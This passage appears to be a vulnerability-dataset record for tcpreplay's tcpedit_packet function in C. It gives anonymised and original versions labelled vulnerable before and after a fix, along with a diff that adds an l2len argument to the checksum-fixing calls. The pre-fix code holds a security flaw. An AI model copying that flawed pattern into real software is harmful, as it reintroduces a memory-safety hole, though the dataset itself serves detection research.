VAR_0->runtime.packetnum++;
dbgx(3, ""packet "" VAR_19 "" caplen %d"", 
VAR_0->runtime.packetnum, (*VAR_1)->caplen);
if (VAR_0->efcs > 0 &&(*VAR_1)->len > 4) {
if ((*VAR_1)->caplen == (*VAR_1)->len) {
(*VAR_1)->caplen -= 4;
}
(*VAR_1)->len -= 4;
}
VAR_12 = tcpedit_dlt_src(VAR_0->dlt_ctx);
VAR_17 = 0;
again:
VAR_5 = NULL;
VAR_6 = NULL;
VAR_7 = NULL;
VAR_10 = 0;
VAR_15 = 0;
VAR_16 = 0;
if ((VAR_9 = tcpedit_dlt_proto(VAR_0->dlt_ctx, VAR_12, VAR_18, (*VAR_1)->caplen)) < 0) {
dbgx(2, ""Packet has no L3+ header: %s"", tcpedit_geterr(VAR_0));
return VAR_20;
} else {
dbgx(2, ""Layer 3 protocol type is: 0x%04x"", ntohs(VAR_9));
}
if ((VAR_13 = tcpedit_dlt_process(VAR_0->dlt_ctx, VAR_2, (*VAR_1)->caplen, VAR_3)) < 0) {
dbgx(3, ""Failed to edit DLT: %s"", tcpedit_geterr(VAR_0));
return VAR_20;
}
VAR_14 = VAR_13 - (*VAR_1)->caplen;
(*VAR_1)->caplen += VAR_14;
(*VAR_1)->len += VAR_14;
VAR_11 = tcpedit_dlt_dst(VAR_0->dlt_ctx);
VAR_8 = tcpedit_dlt_l2len(VAR_0->dlt_ctx, VAR_11, VAR_18, (*VAR_1)->caplen);
if (VAR_8 == -1)
return VAR_20;
dbgx(2, ""dst_dlt = %04x\tsrc_dlt = %04x\tproto = %04x\tl2len = %d"", VAR_11, VAR_12, ntohs(VAR_9), VAR_8);
if (VAR_9 == htons(VAR_21)) {
u_char *VAR_22;
if ((*VAR_1)->caplen < VAR_8 + sizeof(*VAR_5)) {
tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain a layer IP header for DLT 0x%04x"",
VAR_13, VAR_11);
return VAR_20;
}
VAR_5 = (ipv4_hdr_t *)tcpedit_dlt_l3data(VAR_0->dlt_ctx, VAR_11, VAR_18, (*VAR_1)->caplen);
if (VAR_5 == NULL)
return VAR_20;
VAR_22 = get_layer4_v4(VAR_5, (*VAR_1)->caplen - VAR_8);
if (!VAR_22) {
tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain a layer %d byte IP header for DLT 0x%04x"",
VAR_13, VAR_5->ip_hl << 2,  VAR_11);
return VAR_20;
}
dbgx(3, ""Packet has an IPv4 header: 0x%p..."", VAR_5);
} else if (VAR_9 == htons(VAR_23)) {
u_char *VAR_22;
if ((*VAR_1)->caplen < VAR_8 + sizeof(*VAR_6)) {
tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain a layer IPv6 header for DLT 0x%04x"",
VAR_13, VAR_11);
return VAR_20;
}
VAR_6 = (ipv6_hdr_t *)tcpedit_dlt_l3data(VAR_0->dlt_ctx, VAR_11, VAR_18, (*VAR_1)->caplen);
if (VAR_6 == NULL)
return VAR_20;
VAR_22 = get_layer4_v6(VAR_6, (*VAR_1)->caplen - VAR_8);
if (!VAR_22) {
tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain an IPv6 header for DLT 0x%04x"",
VAR_13, VAR_11);
return VAR_20;
}
dbgx(3, ""Packet has an IPv6 header: 0x%p..."", VAR_6);
} else {
dbgx(3, ""Packet isn't IPv4 or IPv6: 0x%04x"", VAR_9);
VAR_5 = NULL;
VAR_6 = NULL;
}
if (VAR_5 != NULL) {
if (VAR_0->tos > -1) {
volatile uint16_t VAR_24 = *((uint16_t*)VAR_5);
volatile uint16_t VAR_25;
VAR_5->ip_tos = VAR_0->tos;
VAR_25 = *((uint16_t*)VAR_5);
csum_replace2(&VAR_5->ip_sum, VAR_24, VAR_25);
}
VAR_17 += rewrite_ipv4_ttl(VAR_0, VAR_5);
if (VAR_0->portmap != NULL) {
if ((VAR_10 = rewrite_ipv4_ports(VAR_0, &VAR_5,
(*VAR_1)->caplen - VAR_8)) < 0)
return VAR_26;
VAR_17 += VAR_10;
}
if (VAR_0->tcp_sequence_enable)
rewrite_ipv4_tcp_sequence(VAR_0, &VAR_5,
(*VAR_1)->caplen - VAR_8);
}
else if (VAR_6 != NULL) {
VAR_17 += rewrite_ipv6_hlim(VAR_0, VAR_6);
if (VAR_0->tclass > -1) {
VAR_16 = VAR_0->tclass << 20;
memcpy(&VAR_15, &VAR_6->ip_flags, 4);
VAR_15 = ntohl(VAR_15) & 0xf00fffff;
VAR_15 += VAR_16; 
VAR_15 = htonl(VAR_15);
memcpy(&VAR_6->ip_flags, &VAR_15, 4);
}
if (VAR_0->flowlabel > -1) {
memcpy(&VAR_15, &VAR_6->ip_flags, 4);
VAR_15 = ntohl(VAR_15) & 0xfff00000;
VAR_15 += VAR_0->flowlabel;
VAR_15 = htonl(VAR_15);
memcpy(&VAR_6->ip_flags, &VAR_15, 4);
}
if (VAR_0->portmap != NULL) {
if ((VAR_10 = rewrite_ipv6_ports(VAR_0, &VAR_6,
(*VAR_1)->caplen - VAR_8)) < 0)
return VAR_26;
VAR_17 += VAR_10;
}
if (VAR_0->tcp_sequence_enable)
rewrite_ipv6_tcp_sequence(VAR_0, &VAR_6, (*VAR_1)->caplen - VAR_8);
}
if (VAR_4) {
VAR_4 = false;
VAR_10 = fuzzing(VAR_0, *VAR_1, VAR_2);
if (VAR_10 < 0) {
return VAR_26;
}
VAR_17 += VAR_10;
goto again;
}
if (VAR_0->fixlen || VAR_0->mtu_truncate) {
if ((VAR_10 = untrunc_packet(VAR_0, *VAR_1, VAR_2, VAR_5, VAR_6)) < 0)
return VAR_26;
VAR_17 += VAR_10;
}
if (VAR_0->rewrite_ip) {
if (VAR_5 != NULL) {
if ((VAR_10 = rewrite_ipv4l3(VAR_0, VAR_5, VAR_3,
(*VAR_1)->caplen - VAR_8)) < 0)
return VAR_26;
VAR_17 += VAR_10;
} else if (VAR_6 != NULL) {
if ((VAR_10 = rewrite_ipv6l3(VAR_0, VAR_6, VAR_3,
(*VAR_1)->caplen - VAR_8)) < 0)
return VAR_26;
VAR_17 += VAR_10;
}
else if (VAR_9 == htons(VAR_27)) {
VAR_7 = (arp_hdr_t *)&(VAR_18[VAR_8]);
if (rewrite_iparp(VAR_0, VAR_7, VAR_3) < 0)
return VAR_26;
}
}
if (VAR_0->seed) {
if (VAR_5 != NULL) {
if ((VAR_10 = randomize_ipv4(VAR_0, *VAR_1, VAR_18, 
VAR_5, (*VAR_1)->caplen - VAR_8)) < 0)
return VAR_26;
VAR_17 += VAR_10;
} else if (VAR_6 != NULL) {
if ((VAR_10 = randomize_ipv6(VAR_0, *VAR_1, VAR_18,
VAR_6, (*VAR_1)->caplen - VAR_8)) < 0)
return VAR_26;
VAR_17 += VAR_10;
} else if (VAR_9 == htons(VAR_27)) {
if (VAR_3 == VAR_28) {
if (randomize_iparp(VAR_0, *VAR_1, VAR_18, 
VAR_0->runtime.dlt1, (*VAR_1)->caplen - VAR_8) < 0)
return VAR_26;
} else {
if (randomize_iparp(VAR_0, *VAR_1, VAR_18, 
VAR_0->runtime.dlt2, (*VAR_1)->caplen - VAR_8) < 0)
return VAR_26;
}
}
}
if ((VAR_0->fixcsum || VAR_17)) {
if (VAR_5 != NULL) {
dbgx(3, ""doing IPv4 checksum: needtorecalc=%d"", VAR_17);
VAR_10 = fix_ipv4_checksums(VAR_0, *VAR_1, VAR_5);
} else if (VAR_6 != NULL) {
dbgx(3, ""doing IPv6 checksum: needtorecalc=%d"", VAR_17);
VAR_10 = fix_ipv6_checksums(VAR_0, *VAR_1, VAR_6);
} else {
dbgx(3, ""checksum not performed: needtorecalc=%d"", VAR_17);
VAR_10 = VAR_29;
}
if (VAR_10 < 0) {
return VAR_26;
} else if (VAR_10 == VAR_30) {
warnx(""%s"", tcpedit_getwarn(VAR_0));
}
}
tcpedit_dlt_merge_l3data(VAR_0->dlt_ctx,
VAR_11, VAR_18,
(*VAR_1)->caplen,
(u_char*)VAR_5,
(u_char*)VAR_6);
VAR_0->runtime.total_bytes += (*VAR_1)->caplen;
VAR_0->runtime.pkts_edited ++;
return VAR_10;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/tcpedit.c/vul/before/0.json,"int
tcpedit_packet(tcpedit_t *tcpedit, struct pcap_pkthdr **pkthdr,
        u_char **pktdata, tcpr_dir_t direction)
{
    bool fuzz_once = tcpedit->fuzz_seed != 0;
    ipv4_hdr_t *ip_hdr;
    ipv6_hdr_t *ip6_hdr;
    arp_hdr_t *arp_hdr;
    int l2len, l2proto, retval;
    int dst_dlt, src_dlt, pktlen, lendiff;
    int ipflags, tclass;
    int needtorecalc;           /* did the packet change? if so, checksum */
    u_char *packet;


    assert(tcpedit);
    assert(pkthdr);
    assert(*pkthdr);
    assert(pktdata);
    assert(*pktdata);
    assert(tcpedit->validated);

    packet = *pktdata;

    tcpedit->runtime.packetnum++;

    dbgx(3, ""packet "" COUNTER_SPEC "" caplen %d"", 
            tcpedit->runtime.packetnum, (*pkthdr)->caplen);

    /*
     * remove the Ethernet FCS (checksum)?
     * note that this feature requires the end user to be smart and
     * only set this flag IFF the pcap has the FCS.  If not, then they
     * just removed 2 bytes of ACTUAL PACKET DATA.  Sucks to be them.
     */
    if (tcpedit->efcs > 0 &&(*pkthdr)->len > 4) {
        if ((*pkthdr)->caplen == (*pkthdr)->len) {
            (*pkthdr)->caplen -= 4;
        }

        (*pkthdr)->len -= 4;
    }

    src_dlt = tcpedit_dlt_src(tcpedit->dlt_ctx);
    
    needtorecalc = 0;
again:
    ip_hdr = NULL;
    ip6_hdr = NULL;
    arp_hdr = NULL;
    retval = 0;
    ipflags = 0;
    tclass = 0;
    /* not everything has a L3 header, so check for errors.  returns proto in network byte order */
    if ((l2proto = tcpedit_dlt_proto(tcpedit->dlt_ctx, src_dlt, packet, (*pkthdr)->caplen)) < 0) {
        dbgx(2, ""Packet has no L3+ header: %s"", tcpedit_geterr(tcpedit));
        return TCPEDIT_SOFT_ERROR;
    } else {
        dbgx(2, ""Layer 3 protocol type is: 0x%04x"", ntohs(l2proto));
    }
        
    /* rewrite Layer 2 */
    if ((pktlen = tcpedit_dlt_process(tcpedit->dlt_ctx, pktdata, (*pkthdr)->caplen, direction)) < 0) {
        /* unable to edit packet, most likely 802.11 management or data QoS frame */
        dbgx(3, ""Failed to edit DLT: %s"", tcpedit_geterr(tcpedit));
        return TCPEDIT_SOFT_ERROR;
    }

    /* update our packet lengths (real/captured) based on L2 length changes */
    lendiff = pktlen - (*pkthdr)->caplen;
    (*pkthdr)->caplen += lendiff;
    (*pkthdr)->len += lendiff;
    
    dst_dlt = tcpedit_dlt_dst(tcpedit->dlt_ctx);
    l2len = tcpedit_dlt_l2len(tcpedit->dlt_ctx, dst_dlt, packet, (*pkthdr)->caplen);
    if (l2len == -1)
        return TCPEDIT_SOFT_ERROR;

    dbgx(2, ""dst_dlt = %04x\tsrc_dlt = %04x\tproto = %04x\tl2len = %d"", dst_dlt, src_dlt, ntohs(l2proto), l2len);

    /* does packet have an IP header?  if so set our pointer to it */
    if (l2proto == htons(ETHERTYPE_IP)) {
        u_char *p;

        if ((*pkthdr)->caplen < l2len + sizeof(*ip_hdr)) {
            tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain a layer IP header for DLT 0x%04x"",
                    pktlen, dst_dlt);
            return TCPEDIT_SOFT_ERROR;
        }

        ip_hdr = (ipv4_hdr_t *)tcpedit_dlt_l3data(tcpedit->dlt_ctx, dst_dlt, packet, (*pkthdr)->caplen);
        if (ip_hdr == NULL)
            return TCPEDIT_SOFT_ERROR;

        p = get_layer4_v4(ip_hdr, (*pkthdr)->caplen - l2len);
        if (!p) {
            tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain a layer %d byte IP header for DLT 0x%04x"",
                    pktlen, ip_hdr->ip_hl << 2,  dst_dlt);
            return TCPEDIT_SOFT_ERROR;
        }

        dbgx(3, ""Packet has an IPv4 header: 0x%p..."", ip_hdr);
    } else if (l2proto == htons(ETHERTYPE_IP6)) {
        u_char *p;

        if ((*pkthdr)->caplen < l2len + sizeof(*ip6_hdr)) {
            tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain a layer IPv6 header for DLT 0x%04x"",
                    pktlen, dst_dlt);
            return TCPEDIT_SOFT_ERROR;
        }

        ip6_hdr = (ipv6_hdr_t *)tcpedit_dlt_l3data(tcpedit->dlt_ctx, dst_dlt, packet, (*pkthdr)->caplen);
        if (ip6_hdr == NULL)
            return TCPEDIT_SOFT_ERROR;

        p = get_layer4_v6(ip6_hdr, (*pkthdr)->caplen - l2len);
        if (!p) {
            tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain an IPv6 header for DLT 0x%04x"",
                    pktlen, dst_dlt);
            return TCPEDIT_SOFT_ERROR;
        }

        dbgx(3, ""Packet has an IPv6 header: 0x%p..."", ip6_hdr);
    } else {
        dbgx(3, ""Packet isn't IPv4 or IPv6: 0x%04x"", l2proto);
        /* non-IP packets have a NULL ip_hdr struct */
        ip_hdr = NULL;
        ip6_hdr = NULL;
    }

    /* The following edits only apply for IPv4 */
    if (ip_hdr != NULL) {

        /* set TOS ? */
        if (tcpedit->tos > -1) {
            volatile uint16_t oldval = *((uint16_t*)ip_hdr);
            volatile uint16_t newval;

            ip_hdr->ip_tos = tcpedit->tos;
            newval = *((uint16_t*)ip_hdr);
            csum_replace2(&ip_hdr->ip_sum, oldval, newval);
        }

        /* rewrite the TTL */
        needtorecalc += rewrite_ipv4_ttl(tcpedit, ip_hdr);

        /* rewrite TCP/UDP ports */
        if (tcpedit->portmap != NULL) {
            if ((retval = rewrite_ipv4_ports(tcpedit, &ip_hdr,
                    (*pkthdr)->caplen - l2len)) < 0)
                return TCPEDIT_ERROR;
            needtorecalc += retval;
        }

        if (tcpedit->tcp_sequence_enable)
            rewrite_ipv4_tcp_sequence(tcpedit, &ip_hdr,
                    (*pkthdr)->caplen - l2len);
    }

    /* IPv6 edits */
    else if (ip6_hdr != NULL) {
        /* rewrite the hop limit */
        needtorecalc += rewrite_ipv6_hlim(tcpedit, ip6_hdr);

        /* set traffic class? */
        if (tcpedit->tclass > -1) {
            /* calculate the bits */
            tclass = tcpedit->tclass << 20;
            
            /* convert our 4 bytes to an int */
            memcpy(&ipflags, &ip6_hdr->ip_flags, 4);
            
            /* strip out the old tclass bits */
            ipflags = ntohl(ipflags) & 0xf00fffff;

            /* add the tclass bits back */
            ipflags += tclass; 
            ipflags = htonl(ipflags);
            memcpy(&ip6_hdr->ip_flags, &ipflags, 4);
        }

        /* set the flow label? */
        if (tcpedit->flowlabel > -1) {
            memcpy(&ipflags, &ip6_hdr->ip_flags, 4);
            ipflags = ntohl(ipflags) & 0xfff00000;
            ipflags += tcpedit->flowlabel;
            ipflags = htonl(ipflags);
            memcpy(&ip6_hdr->ip_flags, &ipflags, 4);
        }

        /* rewrite TCP/UDP ports */
        if (tcpedit->portmap != NULL) {
            if ((retval = rewrite_ipv6_ports(tcpedit, &ip6_hdr,
                    (*pkthdr)->caplen - l2len)) < 0)
                return TCPEDIT_ERROR;
            needtorecalc += retval;
        }

        if (tcpedit->tcp_sequence_enable)
            rewrite_ipv6_tcp_sequence(tcpedit, &ip6_hdr, (*pkthdr)->caplen - l2len);
    }

    if (fuzz_once) {
        fuzz_once = false;
        retval = fuzzing(tcpedit, *pkthdr, pktdata);
        if (retval < 0) {
            return TCPEDIT_ERROR;
        }
        needtorecalc += retval;
        goto again;
    }

    /* (Un)truncate or MTU truncate packet? */
    if (tcpedit->fixlen || tcpedit->mtu_truncate) {
        if ((retval = untrunc_packet(tcpedit, *pkthdr, pktdata, ip_hdr, ip6_hdr)) < 0)
            return TCPEDIT_ERROR;
        needtorecalc += retval;
    }
    
    /* rewrite IP addresses in IPv4/IPv6 or ARP */
    if (tcpedit->rewrite_ip) {
        /* IP packets */
        if (ip_hdr != NULL) {
            if ((retval = rewrite_ipv4l3(tcpedit, ip_hdr, direction,
                    (*pkthdr)->caplen - l2len)) < 0)
                return TCPEDIT_ERROR;
            needtorecalc += retval;
        } else if (ip6_hdr != NULL) {
            if ((retval = rewrite_ipv6l3(tcpedit, ip6_hdr, direction,
                    (*pkthdr)->caplen - l2len)) < 0)
                return TCPEDIT_ERROR;
            needtorecalc += retval;
        }

        /* ARP packets */
        else if (l2proto == htons(ETHERTYPE_ARP)) {
            arp_hdr = (arp_hdr_t *)&(packet[l2len]);
            /* unlike, rewrite_ipl3, we don't care if the packet changed
             * because we never need to recalc the checksums for an ARP
             * packet.  So ignore the return value
             */
            if (rewrite_iparp(tcpedit, arp_hdr, direction) < 0)
                return TCPEDIT_ERROR;
        }
    }


    /* do we need to spoof the src/dst IP address in IPv4 or ARP? */
    if (tcpedit->seed) {
        /* IPv4 Packets */
        if (ip_hdr != NULL) {
            if ((retval = randomize_ipv4(tcpedit, *pkthdr, packet, 
                    ip_hdr, (*pkthdr)->caplen - l2len)) < 0)
                return TCPEDIT_ERROR;
            needtorecalc += retval;

        } else if (ip6_hdr != NULL) {
            if ((retval = randomize_ipv6(tcpedit, *pkthdr, packet,
                    ip6_hdr, (*pkthdr)->caplen - l2len)) < 0)
                return TCPEDIT_ERROR;
            needtorecalc += retval;

        /* ARP packets */
        } else if (l2proto == htons(ETHERTYPE_ARP)) {
            if (direction == TCPR_DIR_C2S) {
                if (randomize_iparp(tcpedit, *pkthdr, packet, 
                        tcpedit->runtime.dlt1, (*pkthdr)->caplen - l2len) < 0)
                    return TCPEDIT_ERROR;
            } else {
                if (randomize_iparp(tcpedit, *pkthdr, packet, 
                        tcpedit->runtime.dlt2, (*pkthdr)->caplen - l2len) < 0)
                    return TCPEDIT_ERROR;
            }
        }
    }

    /* do we need to fix checksums? -- must always do this last! */
    if ((tcpedit->fixcsum || needtorecalc)) {
        if (ip_hdr != NULL) {
            dbgx(3, ""doing IPv4 checksum: needtorecalc=%d"", needtorecalc);
            retval = fix_ipv4_checksums(tcpedit, *pkthdr, ip_hdr, l2len);
        } else if (ip6_hdr != NULL) {
            dbgx(3, ""doing IPv6 checksum: needtorecalc=%d"", needtorecalc);
            retval = fix_ipv6_checksums(tcpedit, *pkthdr, ip6_hdr, l2len);
        } else {
            dbgx(3, ""checksum not performed: needtorecalc=%d"", needtorecalc);
            retval = TCPEDIT_OK;
        }
        if (retval < 0) {
            return TCPEDIT_ERROR;
        } else if (retval == TCPEDIT_WARN) {
            warnx(""%s"", tcpedit_getwarn(tcpedit));
        }
    }

    tcpedit_dlt_merge_l3data(tcpedit->dlt_ctx,
                             dst_dlt, packet,
                             (*pkthdr)->caplen,
                             (u_char*)ip_hdr,
                             (u_char*)ip6_hdr);

    tcpedit->runtime.total_bytes += (*pkthdr)->caplen;
    tcpedit->runtime.pkts_edited ++;
    return retval;
}","int
tcpedit_packet(tcpedit_t *VAR_0, struct pcap_pkthdr **VAR_1,
        u_char **VAR_2, tcpr_dir_t VAR_3)
{
    bool VAR_4 = VAR_0->fuzz_seed != 0;
    ipv4_hdr_t *VAR_5;
    ipv6_hdr_t *VAR_6;
    arp_hdr_t *VAR_7;
    int VAR_8, VAR_9, VAR_10;
    int VAR_11, VAR_12, VAR_13, VAR_14;
    int VAR_15, VAR_16;
    int VAR_17;           /* COMMENT_0 */
    u_char *VAR_18;


    assert(VAR_0);
    assert(VAR_1);
    assert(*VAR_1);
    assert(VAR_2);
    assert(*VAR_2);
    assert(VAR_0->validated);

    VAR_18 = *VAR_2;

    VAR_0->runtime.packetnum++;

    dbgx(3, ""packet "" VAR_19 "" caplen %d"", 
            VAR_0->runtime.packetnum, (*VAR_1)->caplen);

    /* COMMENT_1 */
                                          
                                                                   
                                                                      
                                                                     
       
    if (VAR_0->efcs > 0 &&(*VAR_1)->len > 4) {
        if ((*VAR_1)->caplen == (*VAR_1)->len) {
            (*VAR_1)->caplen -= 4;
        }

        (*VAR_1)->len -= 4;
    }

    VAR_12 = tcpedit_dlt_src(VAR_0->dlt_ctx);
    
    VAR_17 = 0;
again:
    VAR_5 = NULL;
    VAR_6 = NULL;
    VAR_7 = NULL;
    VAR_10 = 0;
    VAR_15 = 0;
    VAR_16 = 0;
    /* COMMENT_7 */
    if ((VAR_9 = tcpedit_dlt_proto(VAR_0->dlt_ctx, VAR_12, VAR_18, (*VAR_1)->caplen)) < 0) {
        dbgx(2, ""Packet has no L3+ header: %s"", tcpedit_geterr(VAR_0));
        return VAR_20;
    } else {
        dbgx(2, ""Layer 3 protocol type is: 0x%04x"", ntohs(VAR_9));
    }
        
    /* COMMENT_8 */
    if ((VAR_13 = tcpedit_dlt_process(VAR_0->dlt_ctx, VAR_2, (*VAR_1)->caplen, VAR_3)) < 0) {
        /* COMMENT_9 */
        dbgx(3, ""Failed to edit DLT: %s"", tcpedit_geterr(VAR_0));
        return VAR_20;
    }

    /* COMMENT_10 */
    VAR_14 = VAR_13 - (*VAR_1)->caplen;
    (*VAR_1)->caplen += VAR_14;
    (*VAR_1)->len += VAR_14;
    
    VAR_11 = tcpedit_dlt_dst(VAR_0->dlt_ctx);
    VAR_8 = tcpedit_dlt_l2len(VAR_0->dlt_ctx, VAR_11, VAR_18, (*VAR_1)->caplen);
    if (VAR_8 == -1)
        return VAR_20;

    dbgx(2, ""dst_dlt = %04x\tsrc_dlt = %04x\tproto = %04x\tl2len = %d"", VAR_11, VAR_12, ntohs(VAR_9), VAR_8);

    /* COMMENT_11 */
    if (VAR_9 == htons(VAR_21)) {
        u_char *VAR_22;

        if ((*VAR_1)->caplen < VAR_8 + sizeof(*VAR_5)) {
            tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain a layer IP header for DLT 0x%04x"",
                    VAR_13, VAR_11);
            return VAR_20;
        }

        VAR_5 = (ipv4_hdr_t *)tcpedit_dlt_l3data(VAR_0->dlt_ctx, VAR_11, VAR_18, (*VAR_1)->caplen);
        if (VAR_5 == NULL)
            return VAR_20;

        VAR_22 = get_layer4_v4(VAR_5, (*VAR_1)->caplen - VAR_8);
        if (!VAR_22) {
            tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain a layer %d byte IP header for DLT 0x%04x"",
                    VAR_13, VAR_5->ip_hl << 2,  VAR_11);
            return VAR_20;
        }

        dbgx(3, ""Packet has an IPv4 header: 0x%p..."", VAR_5);
    } else if (VAR_9 == htons(VAR_23)) {
        u_char *VAR_22;

        if ((*VAR_1)->caplen < VAR_8 + sizeof(*VAR_6)) {
            tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain a layer IPv6 header for DLT 0x%04x"",
                    VAR_13, VAR_11);
            return VAR_20;
        }

        VAR_6 = (ipv6_hdr_t *)tcpedit_dlt_l3data(VAR_0->dlt_ctx, VAR_11, VAR_18, (*VAR_1)->caplen);
        if (VAR_6 == NULL)
            return VAR_20;

        VAR_22 = get_layer4_v6(VAR_6, (*VAR_1)->caplen - VAR_8);
        if (!VAR_22) {
            tcpedit_seterr(VAR_0, ""Packet length %d is too short to contain an IPv6 header for DLT 0x%04x"",
                    VAR_13, VAR_11);
            return VAR_20;
        }

        dbgx(3, ""Packet has an IPv6 header: 0x%p..."", VAR_6);
    } else {
        dbgx(3, ""Packet isn't IPv4 or IPv6: 0x%04x"", VAR_9);
        /* COMMENT_12 */
        VAR_5 = NULL;
        VAR_6 = NULL;
    }

    /* COMMENT_13 */
    if (VAR_5 != NULL) {

        /* COMMENT_14 */
        if (VAR_0->tos > -1) {
            volatile uint16_t VAR_24 = *((uint16_t*)VAR_5);
            volatile uint16_t VAR_25;

            VAR_5->ip_tos = VAR_0->tos;
            VAR_25 = *((uint16_t*)VAR_5);
            csum_replace2(&VAR_5->ip_sum, VAR_24, VAR_25);
        }

        /* COMMENT_15 */
        VAR_17 += rewrite_ipv4_ttl(VAR_0, VAR_5);

        /* COMMENT_16 */
        if (VAR_0->portmap != NULL) {
            if ((VAR_10 = rewrite_ipv4_ports(VAR_0, &VAR_5,
                    (*VAR_1)->caplen - VAR_8)) < 0)
                return VAR_26;
            VAR_17 += VAR_10;
        }

        if (VAR_0->tcp_sequence_enable)
            rewrite_ipv4_tcp_sequence(VAR_0, &VAR_5,
                    (*VAR_1)->caplen - VAR_8);
    }

    /* COMMENT_17 */
    else if (VAR_6 != NULL) {
        /* COMMENT_18 */
        VAR_17 += rewrite_ipv6_hlim(VAR_0, VAR_6);

        /* COMMENT_19 */
        if (VAR_0->tclass > -1) {
            /* COMMENT_20 */
            VAR_16 = VAR_0->tclass << 20;
            
            /* COMMENT_21 */
            memcpy(&VAR_15, &VAR_6->ip_flags, 4);
            
            /* COMMENT_22 */
            VAR_15 = ntohl(VAR_15) & 0xf00fffff;

            /* COMMENT_23 */
            VAR_15 += VAR_16; 
            VAR_15 = htonl(VAR_15);
            memcpy(&VAR_6->ip_flags, &VAR_15, 4);
        }

        /* COMMENT_24 */
        if (VAR_0->flowlabel > -1) {
            memcpy(&VAR_15, &VAR_6->ip_flags, 4);
            VAR_15 = ntohl(VAR_15) & 0xfff00000;
            VAR_15 += VAR_0->flowlabel;
            VAR_15 = htonl(VAR_15);
            memcpy(&VAR_6->ip_flags, &VAR_15, 4);
        }

        /* COMMENT_16 */
        if (VAR_0->portmap != NULL) {
            if ((VAR_10 = rewrite_ipv6_ports(VAR_0, &VAR_6,
                    (*VAR_1)->caplen - VAR_8)) < 0)
                return VAR_26;
            VAR_17 += VAR_10;
        }

        if (VAR_0->tcp_sequence_enable)
            rewrite_ipv6_tcp_sequence(VAR_0, &VAR_6, (*VAR_1)->caplen - VAR_8);
    }

    if (VAR_4) {
        VAR_4 = false;
        VAR_10 = fuzzing(VAR_0, *VAR_1, VAR_2);
        if (VAR_10 < 0) {
            return VAR_26;
        }
        VAR_17 += VAR_10;
        goto again;
    }

    /* COMMENT_25 */
    if (VAR_0->fixlen || VAR_0->mtu_truncate) {
        if ((VAR_10 = untrunc_packet(VAR_0, *VAR_1, VAR_2, VAR_5, VAR_6)) < 0)
            return VAR_26;
        VAR_17 += VAR_10;
    }
    
    /* COMMENT_26 */
    if (VAR_0->rewrite_ip) {
        /* COMMENT_27 */
        if (VAR_5 != NULL) {
            if ((VAR_10 = rewrite_ipv4l3(VAR_0, VAR_5, VAR_3,
                    (*VAR_1)->caplen - VAR_8)) < 0)
                return VAR_26;
            VAR_17 += VAR_10;
        } else if (VAR_6 != NULL) {
            if ((VAR_10 = rewrite_ipv6l3(VAR_0, VAR_6, VAR_3,
                    (*VAR_1)->caplen - VAR_8)) < 0)
                return VAR_26;
            VAR_17 += VAR_10;
        }

        /* COMMENT_28 */
        else if (VAR_9 == htons(VAR_27)) {
            VAR_7 = (arp_hdr_t *)&(VAR_18[VAR_8]);
            /* COMMENT_29 */
                                                                       
                                                  
               
            if (rewrite_iparp(VAR_0, VAR_7, VAR_3) < 0)
                return VAR_26;
        }
    }


    /* COMMENT_33 */
    if (VAR_0->seed) {
        /* COMMENT_34 */
        if (VAR_5 != NULL) {
            if ((VAR_10 = randomize_ipv4(VAR_0, *VAR_1, VAR_18, 
                    VAR_5, (*VAR_1)->caplen - VAR_8)) < 0)
                return VAR_26;
            VAR_17 += VAR_10;

        } else if (VAR_6 != NULL) {
            if ((VAR_10 = randomize_ipv6(VAR_0, *VAR_1, VAR_18,
                    VAR_6, (*VAR_1)->caplen - VAR_8)) < 0)
                return VAR_26;
            VAR_17 += VAR_10;

        /* COMMENT_28 */
        } else if (VAR_9 == htons(VAR_27)) {
            if (VAR_3 == VAR_28) {
                if (randomize_iparp(VAR_0, *VAR_1, VAR_18, 
                        VAR_0->runtime.dlt1, (*VAR_1)->caplen - VAR_8) < 0)
                    return VAR_26;
            } else {
                if (randomize_iparp(VAR_0, *VAR_1, VAR_18, 
                        VAR_0->runtime.dlt2, (*VAR_1)->caplen - VAR_8) < 0)
                    return VAR_26;
            }
        }
    }

    /* COMMENT_35 */
    if ((VAR_0->fixcsum || VAR_17)) {
        if (VAR_5 != NULL) {
            dbgx(3, ""doing IPv4 checksum: needtorecalc=%d"", VAR_17);
            VAR_10 = fix_ipv4_checksums(VAR_0, *VAR_1, VAR_5, VAR_8);
        } else if (VAR_6 != NULL) {
            dbgx(3, ""doing IPv6 checksum: needtorecalc=%d"", VAR_17);
            VAR_10 = fix_ipv6_checksums(VAR_0, *VAR_1, VAR_6, VAR_8);
        } else {
            dbgx(3, ""checksum not performed: needtorecalc=%d"", VAR_17);
            VAR_10 = VAR_29;
        }
        if (VAR_10 < 0) {
            return VAR_26;
        } else if (VAR_10 == VAR_30) {
            warnx(""%s"", tcpedit_getwarn(VAR_0));
        }
    }

    tcpedit_dlt_merge_l3data(VAR_0->dlt_ctx,
                             VAR_11, VAR_18,
                             (*VAR_1)->caplen,
                             (u_char*)VAR_5,
                             (u_char*)VAR_6);

    VAR_0->runtime.total_bytes += (*VAR_1)->caplen;
    VAR_0->runtime.pkts_edited ++;
    return VAR_10;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/tcpedit.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -278,10 +278,10 @@
     if ((tcpedit->fixcsum || needtorecalc)) {
         if (ip_hdr != NULL) {
             dbgx(3, ""doing IPv4 checksum: needtorecalc=%d"", needtorecalc);
-            retval = fix_ipv4_checksums(tcpedit, *pkthdr, ip_hdr);
+            retval = fix_ipv4_checksums(tcpedit, *pkthdr, ip_hdr, l2len);
         } else if (ip6_hdr != NULL) {
             dbgx(3, ""doing IPv6 checksum: needtorecalc=%d"", needtorecalc);
-            retval = fix_ipv6_checksums(tcpedit, *pkthdr, ip6_hdr);
+            retval = fix_ipv6_checksums(tcpedit, *pkthdr, ip6_hdr, l2len);
         } else {
             dbgx(3, ""checksum not performed: needtorecalc=%d"", needtorecalc);
